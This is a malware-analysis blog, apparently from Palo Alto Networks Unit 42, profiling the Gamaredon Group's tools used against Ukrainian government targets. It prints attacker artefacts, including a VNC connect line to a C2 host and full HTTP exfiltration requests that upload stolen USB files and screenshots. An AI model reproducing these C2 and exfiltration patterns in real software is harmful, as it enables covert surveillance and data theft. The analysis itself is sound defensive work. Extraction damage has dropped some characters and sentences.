We have labelled this threat group the\nGamaredon Group and our research shows that the Gamaredon Group has been active since at least 2013.\n\nIn the past, the Gamaredon Group has relied heavily on off-the-shelf tools. Our new research shows the Gamaredon Group have made a shift to\ncustom-developed malware. We believe this shift indicates the Gamaredon Group have improved their technical capabilities. The custom-developed\nmalware is fully featured an includes these capabilities:\n\nA mechanism for downloading and executing additional payloads of their choice\nThe ability to scan system drives for speci�c �le types\nThe ability to capture screenshots\nThe ability to remotely execute commands on the system in the user’s security context\n\nThe Gamaredon Group primarily makes use of compromised domains, dynamic DNS providers, Russian and Ukrainian country code top-level domains\n(ccTLDs), and Russian hosting providers to distribute their custom-built malware.\n\nAntimalware technologies have a poor record of detecting the malware this group has developed. We believe this is likely due to the modular nature of\nthe malware, the malware’s heavy use of batch scripts, and the abuse of legitimate applications and tools (such as wget) for malicious purposes.\n\n[Previously, LookingGlass reported (https://www.lookingglasscyber.com/operation-armageddon-registration/) on a campaign they named “Operation](https://www.lookingglasscyber.com/operation-armageddon-registration/)\nArmageddon,” targeting individuals involved in the Ukrainian military and national security establishment. Because we believe this group is behind that\ncampaign, we’ve named them the Gamaredon Group, an anagram of “Armageddon”. At this time, it is unknown if the new payloads this group is\ndistributing is a continuation of Operation Armageddon or a new campaign.\n\n### Gamaredon: Historical Tool Analysis\n\nThe earliest discovered sample (based on compile times and sandbox submission times) distributed by this threat group resembles the descriptions of\n[Gamaredon provided by Symantec (https://www.symantec.com/security_response/writeup.jsp?docid=2015-042917-4812-99&tabid=2) and Trend](https://www.symantec.com/security_response/writeup.jsp?docid=2015-042917-4812-99&tabid=2)\nMicro (https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/troj_gamaredon.a). Unfortunately, this identi�cation is rather tenuous, as\nit seems to only identify the �rst variant of payloads used by our threat actors. Some samples of later payload variants also have been given the generic\n[and brittle names of TROJ_RESETTER.BB (https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/troj_resetter.bb) and](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/troj_resetter.bb)\n[TROJ_FRAUDROP.EX (https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/troj_fraudrop.ex).](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/troj_fraudrop.ex)\n\nOriginally, the payloads delivered to targets by this threat group consisted of a password protected Self-extracting Zip-archive (.SFX) �le which, when\nextracted, wrote a batch script to disk and installed a legitimate remote administration tool called tool Remote Manipulator System\n(https://rmansys.ru/remote-access/) (Figure 1) which they would abuse for malicious purposes.\n\n\n-----\n\n(http://researchcenter.paloaltonetworks.com/wp\ncontent/uploads/2017/02/Gamaredon_1.png)\n\n_Figure 1 Remote Manipulator System Interface_\n\nOne such self-extracting archive (ca87eb1a21c6d4ffd782b225b178ba65463f73de6f4c736eb135be5864f556dc) was �rst observed around April of\n2014. The password (reused by many of the password protected SFX payloads) it used to extract itself is “1234567890__”. The �les included in this SFX\n�le we observed include a batch �le named “123.cmd” and another SFX named “setting.exe”. This second SFX contains a .MSI installer package which\ninstalls Remote Manipulator System and a batch script which handles the installation.\n\nLater payloads would write batch scripts to disk as well as wget binaries. The batch scripts would use the wget binaries to download and execute\nadditional executables. The scripts would also use wget to send POST requests to command and control (C2) servers that would contain information\nabout the compromised system. Some of these payloads included decoy documents that would open when the malware is executed.\n\nThree examples of this type of payload include:\n\na6a44ee854c846f31d15b0ca2d6001fb0bdddc85f17e2e56abb2fa9373e8cfe7\nb5199a302f053e5e9cb7e82cc1e502b5edbf04699c2839acb514592f2eeabb13\n3ef3a06605b462ea31b821eb76b1ea0fdf664e17d010c1d5e57284632f339d4b\n\nWe �rst observed these samples using wget in 2014. The �lenames and decoy documents these samples used attempt to lure individuals by using the\npresidential administration of Ukraine, Ukrainian national security and defense, the Anti-Terrorist Operation Zone in the Ukraine, and Ukrainian\npatriotism as subjects. The text of one such decoy document is pictured below.\n\n\n-----\n\n(http://researchcenter.paloaltonetworks.com/wp\ncontent/uploads/2017/02/Gamaredon_2.png)\n\n_Figure 2 Ukrainian Decoy Document used by Gamaredon Group_\n\nOther observed payloads would, again, use SFX �les to deliver a batch script and an executable that allowed remote access through the VNC protocol.\nThese VNC exectuables would either be included in the SFX �le or downloaded by the batch script. We found one URL (now taken down) that hosted a\nVNC executable that the malware would attempt to download and install at hxxp://prestigeclub.frantov.com[.]ua/press-center/press/chrome-xvncv5517.exe.\n\nThe batch script would then attempt to have the VNC program connect to a command and control (C2) server to enable the server to control the\ncompromised system. All VNC installations on compromised systems that we observed have used the same con�guration �le, RC4 key �le, and\npasswords.\n\nOne such sample, cfb8216be1a50aa3d425072942ff70f92102d4f4b155ab2cf1e7059244b99d31 �rst appeared around January of 2015. The batch\nscript utilized in this sample ensures a VNC connection is available:\n\n\n1 start winlogons -autoreconnect -id:%sP% -connect grom56.ddns.net:5500\n\n\nThe path con�gured in the VNC con�guration �le across all implants employing VNC (UltraVNC.ini) is “Y:\\ПРОБА\\Создание троянов\\создание\nRMS\\vnc”. This isn’t the only place hardcoded Cyrillic �le paths are used by implants. Many of the batch scripts also use hardcoded paths such as\n“Главное меню\\Программы\\Автозагрузка”. Many payloads also include a VBS script which raises a dialog box to the users asking them to run the\nmalware again. It reads, “Ошибка при инициализации приложения (0xc0000005). Повторить попытку открытия файла?” (English Translation from\nRussian: Application failed to initialize (0xc0000005). Try to open the �le again?).\n\n[Some of the SFX �les also include another legitimate application called ChkFlsh.exe (http://mikelab.kiev.ua/index.php?page=PROGRAMS/chk�sh)](http://mikelab.kiev.ua/index.php?page=PROGRAMS/chkflsh)\n(8c9d690e765c7656152ad980edd2200b81d2afceef882ed81287fe212249f845). This application was written by a Ukrainian programmer and is used\nto check performance of USB �ash drives. Its value to the attackers to the attackers isn’t clear but one possibility is that it is somehow used to steal or\nmonitor �les on USB devices. In our research, we found this application present in some SFX �les along with VNC programs and in some SFX �les that\ndidn’t have VNC programs included.\n\n### Custom Implants\n\nWhile the most recent samples observed still use batch scripts and SFX �les, the Gamaredon Group has moved away from applications like wget,\nRemote Manipulator Tool, VNC and ChkFlsh.exe. Instead of using wget the attackers are distributing custom developed downloaders, and instead of\nRemote Manipulator or VNC the malware is using a custom developed remote access implant.\n\nIn June of 2015 a custom downloader used by many newer samples was �rst seen in the wild and is often included in SFX implants with the name\n“LocalSMS.dll”. This downloader makes requests to adobe.update-service[.]net (hardcoded in the sample) and is further discussed in Appendix A.\n\nIn February 2016, another custom tool now often included in SFX implants was seen in the wild. This SFX �le\n(3773ddd462b01f9272656f3150f2c3de19e77199cf5fac1f44287d11593614f9) contains a new Trojan\n(598c55b89e819b23eac34547ad02e5cd59e1b8fcb23b5063a251d8e8fae8b824) we refer to as “Pteranodon.” Pteranodon is a custom backdoor\nwhich is capable of the following tasks:\n\nCapturing screenshots at a con�gurable interval and uploading them to the attacker\n\n\n-----\n\nThe earliest version of Pteranodon uses a hardcoded URL for command and control. It sends POST requests to msrestore[.]ru/post.php using a static\nmultipart boundary:\n\n————870978B0uNd4Ry_$\n\nNewer versions of the tool also use hardcoded domains and multipart boundaries. They also share similar pdb strings. Other Pteranodon samples can\n[be found in AutoFocus using the Pteranodon (https://autofocus.paloaltonetworks.com/#/tag/Unit42.Pteranodon) tag. The most recent variant of](https://autofocus.paloaltonetworks.com/#/tag/Unit42.Pteranodon)\nPteranodon is analyzed in Appendix A.\n\nWe have only identi�ed one delivery vector for the new implants thus far. A Javascript �le\n(f2355a66af99db5f856ebfcfeb2b9e67e5e83fff9b04cdc09ac0fabb4af556bd) �rst seen in December of 2016 downloads a resource from\nhttp://samotsvety.com[.]ua/�les/index.pht (likely a compromised site used for staging payloads) which previously an SFX �le\n(b2fb7d2977f42698ea92d1576fdd4da7ad7bb34f52a63e4066f158a4b1ffb875) containing two of the Gamaredon custom tools.\n\nA related sample (e24715900aa5c9de807b0c8f6ba8015683af26c42c66f94bee38e50a34e034c4) used the same distinct Mutex and contains a larger\nset of tools for analysis. The original name of the �le is “AdapterTroubleshooter.exe” and the �le uses icons which resemble those used by OpenVPN, as\nseen below.\n\n(http://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_3.png)\n\nUpon examining the sample’s �le activity within AutoFocus it is clear the sample is a self-extracting executable.\n\n(http://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_4.png)\n\n_Figure 3 Self Extracting executable behavior shown in AutoFocus_\n\nOpening the sample with 7zip inside of a virtual machine, all the �les contents can be examined.

These individual implants are analyzed in detail in Appendix A.\n\n### Trends Across Implants\n\nWhile the payloads used to control compromised systems have evolved over time, many commonalities appear across the samples. While not every\nsample distributed by this group is described in this blog, hashes of the known samples are included in the Indicators of Compromise section. Some\ninteresting behaviors from a few of the related samples include:\n\nMany of the batch scripts include misspellings of common English words. One such example is the �lename “cmd”. While another example,\n“domen”, is used as a variable name in a batch script which is likely meant to be “domain”\nAlmost all batch scripts in all samples ping localhost as a means of sleeping\nMany of the batch scripts are named “cmd” and some include the string “Trons_ups” and “Treams”\nMany of the batch scripts use the same commands for determining operating system version.\nMany of the early samples used applications such as wget, UltraVNC, and ChkFlash. These utilities have been replaced with custom tools in the\nlatest sample\nSamples employing VNC used the same con�guration and passwords\n\nAdditionally, the infrastructure used by this group has not changed much in the past three years. Many of the samples reused the same domains for\nimplant communication. Also, many of the custom developed tools use hardcoded network locations.\n\nMonikers used for �lenames, exported DLL functions, domains, and variable names in scripts seem to be themed and consistent. By pivoting on\nindicators from one of the SFX implants within AutoFocus additional samples are easily identi�ed by overlaps in these consistencies. Most samples\nwere delivered in a similar fashion: an SFX dropping resources which are staged and loaded with a batch and/or VBS script. The reuse of SSL certi�cates\nbetween IPv4 addresses as well as the reuse of IPv4 addresses between domains names is apparent when viewing a large collection of entities involved\nin this campaign, as shown below.\n\n\n-----\n\n(http://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_8.png)\n\nFocusing in on one of the newest samples (analyzed in Appendix A), the reuse of �le names as well as SFX content �les becomes apparent.\n\n(http://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_9.png)\n\n_Figure 6 Overview of the relationships between Samples and Network Infrastructure used by the Gamaredon Group_\n\n### Final Word\n\nThe implants identi�ed have limited, generic, and often con�icting detections on VirusTotal. The threat group using these implants has been active since\nat least 2014 and has been seen targeting individuals likely involved in the Ukrainian government. Some of the samples share delivery mechanisms and\ninfrastructure with samples which are detected by a few antivirus vendors as Gamaredon. However, newer variants deliver more advanced malware\nwhich goes unnamed.\n\nPeriodically, researchers at Palo Alto Networks hunt through WildFire execution reports, using AutoFocus, to identify untagged samples’ artifacts in\nthe hopes of identifying previously undiscovered malware families, behaviors, and campaigns.\n\nThis blog presents a threat group identi�ed by the above process using AutoFocus. By actively hunting for malicious activity and �les instead of waiting\nfor alerts to triage, defenders can identify and building protections for new trends before they arrive on their corporate networks and endpoints. More\ndetails about this threat group can be found in the AutoFocus tag GamaredonGroup\n(https://autofocus.paloaltonetworks.com/#/tag/Unit42.GamaredonGroup).\n\nPalo Alto Networks customers are protected from this threat in the following ways:\n\nWildFire identi�es the malware described in this report as malicious.\nTraps prevents execution of the malware described in this report\n\n\n-----\n\n### Appendix A: Custom Implant Analyses\n\n###### USBStealer: MSO5678.usb / Of�ceUpdate.dll\n\nThis �le is a USB �le stealer which can be also guessed by its internal name “USBgrabber.dll”. However, the implementation is sloppy which makes it a �le\nstealer for any newly connected logical volume on a system. This is because the malware monitors the computer for messages WM_COMMAND and\nWM_DEVICECHANGE, but not verifying if a USB drive was connected.\n\nThe malware creates two mutexes “__Wsnusb73__” and “__Wsnusbtt73__”. Then, it creates the following folder in the temp path of the local user:\n\n“C:\\Users\\<Username>\\AppData\\Local\\Temp\\reports”\n\nThis folder is used as a temporary location to copy all �les from a newly connected logical drive to and upload them to the C2 server. The �les are\ntransferred to the hardcoded C2 server “195.62.52.93” one by one via HTTP POST method. The following request is used which also includes\ninformation about the victim, the �le to be transferred as well as the source drive:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\nPOST /post.php HTTP/1.1\nContent-Type: multipart/form-data; boundary=----qwerty\nHost: 195.62.52.93\nContent-Length: ...\nCache-Control: no-cache\n\n------qwerty\nContent-Disposition: form-data; name=\"filename\"\n\n\\\\<filename>\n------qwerty\nContent-Disposition: form-data; name=\"filedate\"\n\n<month>/<day>/<year> <hour>:<seconds>\n------qwerty\nContent-Disposition: form-data; name=\"compname\"\n\n<ComputerName>||<Username>||<UserHWGUID>||<C_VolumeSerialNumber>\n------qwerty\nContent-Disposition: form-data; name=\"serial\"\n\n<SerialNumberOfDriveToStealFrom>\n------qwerty\nContent-Disposition: form-data; name=\"w\"\n\n\"?\"\n------qwerty\nContent-Disposition: form-data; name=\"filesize\"\n\n<FileSize>\n------qwerty\nContent-Disposition: form-data; name=\"file\"; filename=\"<AbsoluteFilePathInTemporaryLocation>\"\nContent-Type: application/octet-stream\nContent-Transfer-Encoding: binary\n\n...File data...\n\n------qwerty-\n\nThe malware also creates a SQLite database named “asha.dat” in the local users temp folder. Therein, it keeps track of �les which were stolen by\ncalculating the MD5 hash of the �lename followed by the �le length. Therefore, it creates a Unicode string of the original �le path from the drive and\nconcatenates the �le size in bytes to it. Finally, it uses the API functions MD5Init(), MD5Update() and MD5Final() to calculate the hash and store it in\nthe database.\n\n(http://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/02/Gamaredon_10.png)\n\n_Figure 7 Structure of the database created by the malware_\n\nIt should be noted, that only hashes of �les are added to the database that don’t have the following extensions:\n\nDLL\nBIN\nCAB\nEXE\nISO\n\n### Downloader: MSO1567.dls / LocalSMS.dll\n\nThis �le is essentially a simple downloader which contacts the C2 server to send some user data and get an executable as response which will be\nexecuted. The DLL is written in C++ and contains all of the functionality is in an export function named “EntryPoint”. The �le was compiled without any\ncompiler or linker optimizations, thus the big �le size and the remaining PDB path string.\n\n\n-----\n\n“1956047236”). Next, it takes the following hardcoded string:\n\nhttp://adobe.update-service[.]net/index.php?comp=\n\nTo create a URL string with the victims information for contacting the C2 server:\n\nhttp://adobe.update-service[.]net/index.php?comp=WIN-MLABCSUOVJB&id=WIN-MLABCSUOVJB_{826ee360-7139-11de-8d20808e6f6e6263}1956047236\n\nTo create the �lename where the downloaded �le will be saved, the malware tries to build a random string of 10 characters. However, due to an\nimplementation error the string always ends up being the same, namely “frAQBc8Wsa”. This string gets concatenated with the retrieved local users\ntemp path to the following �le path:\n\nC:\\Users\\<Username>\\AppData\\Local\\Temp\\frAQBc8Wsa\n\nThen, it uses the API function URLDownloadToFileA() to download a payload to disk and executes it via CreateProcess(). Finally, it sleeps for 60 seconds\nbefore terminating the payload and the DLL exits.\n\n### Downloader: MSO8734.obn / MpClients.dll\n\nThis �le is a slightly more advanced version of LocalSMS.dll downloader. Instead of downloading a payload directly to disk, this �le requests a download\ncommand from the C2 server which contains the actual payload URL to be used. Therefore, it uses a basic network implementation based on the\nWinsock functions. All the functionality of this DLL is put into an export function named “bitDefender”.\n\nIt creates a socket, requests the address of the hardcoded C2 server “win-restore.ru” via gethostbyname() and connects to it. Thereafter, it also collects\nthe volume serial number of C:\\ drive, the computer name and the hardware pro�le GUID. With this information, it creates the following string used by\na subsequent send() function call:\n\n“GET /css.php?id=WIN-MLABCSUOVJB_{826ee360-7139-11de-8d20-808e6f6e6263}1956047236 HTTP/1.1\nHost: win-restore.ru\nConnection: close”\n\nThe response will be stored into a memory buffer via recv() and scanned for the string “urltoload={“. As the name suggests, the received data contains\nthe actual URL of the payload inside curly brackets. The URL gets pulled out of the string and is used again as input for the API function\nURLDownloadToFile(). Again, the same �le path will be used to store the payload on disk and execute it:\n“C:\\Users\\<Username>\\AppData\\Local\\Temp\\frAQBc8Wsa”\n\n### Pteranodon: MSO1234.win / winrestore.dll\n\nPteranodon is a backdoor which also can capture screenshots based on a con�guration �le created on the disk. Further, it uploads the screenshots to\nthe C2 server unencrypted. All the functionality of this DLL is put into an export function named “updater”.\n\nAt �rst, it retrieves the %APPDATA% folder of the local user to build the following �le path:\n\n“C:\\Users\\<Username>\\AppData\\Roaming\\Microsoft\\desktop.ini”\n\nThen, it checks if the �le already exists and continues execution if so. If not, it runs a routine which checks if there is mouse movement as an antisandbox technique. If no mouse movement is detected the malware runs in an in�nite loop checking for mouse movement.\n\nIf the �le “desktop.ini” does not exist, the malware creates it and writes the following information into it:\n\n” interval={60} msfolder={10} status={0}”\n\nThis information is used as con�guration data to create the screenshots. There are also other commands possible which can be retrieved from the C2\nserver. The following commands are available:\n\n**exec={**\n\nThis command is used to download and execute a payload from a URL present in the curly brackets. It creates a random �le path in temp folder, calls\nURLDownloadToFile() and CreateProcess() to run the payload. Then, it waits 30s and terminates the payload.\n\n**interval={**\n\nThis command is used to de�ne the interval in seconds between the creation of two or more screenshots.\n\n**msfolder={**\n\nThis command de�nes the number of screenshots to create.\n\n**command={ / command_c={**\n\nThis command is used to execute a �le present as a string between the curly brackets. The variant with the “c” uses the Windows tool cmd.exe with help\nof ShellExecute().\n\n**status={**\n\nThis command contains the �ag which de�nes if screenshots should be made (“1”) or not (“0”).\n\nNext, it checks for a mutex named “asassin1dj” to verify if the system is already infected and creates it if this isn’t the case:\n\n\n-----\n\n(http://researchcenter.paloaltonetworks.com/wp\ncontent/uploads/2017/02/Gamaredon_11.png)\n\n_Figure 8 Mutex check and creation routine_\n\nNext, it creates the following folder, if not already present:\n\n“C:\\Users\\<Username>\\AppData\\Roaming\\Microsoft\\store”\n\nNext, according to the con�guration data in “desktop.ini” it constantly creates 24-bit color depth JPEG screenshots without extension in the store\nfolder with help of GDI32 and gdiplus API functions. The following �le naming scheme for the screenshots is used:\n\n<year><month><day>_<hour><minute><seconds>\n\nAfter the last screenshot was created, it uploads all �les from the “store” folder to the C2 server “win-restore[.]ru”. Then, it deletes all the �les present in\nthe folder and starts a new screenshot creation cycle. It should be noted that there is no check of what �les are uploaded. The �les are uploaded via\nPOST HTTP method to the script “vvd.php”. For this, the following HTTP request is used which contains also data from the victim as well the JPEG �les:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\nPOST /vvd.php HTTP/1.1\nAccept: application/x-www-form-urlencoded\nConnection: Keep-Alive\nContent-Type: multipart/form-data; boundary=----------987978B0urd3Gf_$\nAccept-Charset: utf-8\nUser-Agent: asasing\nHost: win-restore.ru\nContent-Length: <length>\nCache-Control: no-cache\n\n------------987978B0urd3Gf_$\nContent-Type: text/html\nContent-Disposition: form-data; name=\"uuid\"\n\nWIN-MLABCSUOVJB_{826ee360-7139-11de-8d20-808e6f6e6263}1956047236\n------------987978B0urd3Gf_$\nContent-Type: application/octet-stream\nContent-Disposition: form-data; name=\"file0\"; filename=\"<year><month><day>_<hour><minute><seconds>\"\nContent-Transfer-Encoding: 8bit\n...JPEG file...\n------------987978B0urd3Gf_$\nContent-Type: application/octet-stream\nContent-Disposition: form-data; name=\"file1\"; filename=\"<year><month><day>_<hour><minute><seconds>\"\nContent-Transfer-Encoding: 8bit\n...JPEG file...\n...\n------------987978B0urd3Gf_$\n\n\nFinally, it checks if any new command information is available from the C2 server and updates the “desktop.ini” �le according to it. Based on\nfunctionality, compile timestamps, and binary differencing this malware is likely an updated version of\n598c55b89e819b23eac34547ad02e5cd59e1b8fcb23b5063a251d8e8fae8b824.\n\n###### wmphost.exe\n\nThis �le runs an in�nite loop until mouse movement gets detected, then it exits. This �le can be used to circumvent sandboxes that don’t simulate mouse\nmovement. To detect if it’s running inside a sandbox, another �le can scan the list of running processes to see if “wmphost.exe” is present or not.\n\n### Appendix B: Indicators of Compromise\n\n**Domain
